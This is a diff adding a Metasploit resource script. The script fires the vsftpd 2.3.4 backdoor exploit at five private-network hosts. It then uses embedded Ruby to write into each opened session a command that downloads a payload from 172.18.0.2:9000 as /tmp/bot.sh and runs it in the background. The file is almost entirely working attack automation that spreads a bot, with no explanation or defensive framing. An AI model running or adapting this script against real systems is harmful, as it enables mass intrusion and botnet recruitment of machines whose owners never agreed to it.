@@ -1,0 +1,24 @@
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+set RHOSTS 172.18.0.3
+exploit -z
+set RHOSTS 172.18.0.4
+exploit -z
+set RHOSTS 172.18.0.5
+exploit -z
+set RHOSTS 172.18.0.6
+exploit -z
+set RHOSTS 172.18.0.7
+exploit -z
+
+sleep 3
+
+# Deploy payload to each session using Ruby
+<ruby>
+framework.sessions.each do |sid, session|
+  print_status("Deploying payload to session #{sid}")
+  session.shell_write("curl -s http://172.18.0.2:9000/payload -o /tmp/bot.sh && chmod +x /tmp/bot.sh && nohup /tmp/bot.sh >/tmp/bot.log 2>&1 &\n")
+  print_good("Command sent to session #{sid}")
+end
+print_good("Payload deployment complete!")
+</ruby>
